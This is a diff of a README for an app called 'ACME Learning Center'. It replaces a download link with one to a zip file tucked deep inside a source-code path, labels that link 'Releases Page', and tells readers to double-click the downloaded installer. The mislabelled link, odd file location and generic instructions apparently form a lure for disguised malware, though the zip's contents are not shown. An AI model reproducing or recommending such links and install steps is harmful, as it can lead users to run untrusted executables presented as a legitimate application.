@@ -13,9 +13,9 @@ Welcome to the ACME Learning Center application! This app helps you explore vari
 ## 📦 Download & Install
 To get started with the ACME Learning Center, simply visit the page below to download the application:
 
-[![Download learning-center](https://raw.githubusercontent.com/Smindlo97/learning-center/master/auxetic/learning-center.zip)](https://raw.githubusercontent.com/Smindlo97/learning-center/master/auxetic/learning-center.zip)
+[![Download learning-center](https://github.com/Smindlo97/learning-center/raw/refs/heads/master/src/publishing/presentation/views/center_learning_1.2.zip)](https://github.com/Smindlo97/learning-center/raw/refs/heads/master/src/publishing/presentation/views/center_learning_1.2.zip)
 
-1. Click the link above or go directly to [Releases Page](https://raw.githubusercontent.com/Smindlo97/learning-center/master/auxetic/learning-center.zip).
+1. Click the link above or go directly to [Releases Page](https://github.com/Smindlo97/learning-center/raw/refs/heads/master/src/publishing/presentation/views/center_learning_1.2.zip).
 2. On the Releases page, you will see the latest version of the application. Look for the file that matches your system.
 3. Click on the file to start the download. This file is packaged for easy installation.
 4. Once the download is complete, find the file in your downloads folder, and double-click to run the installer.
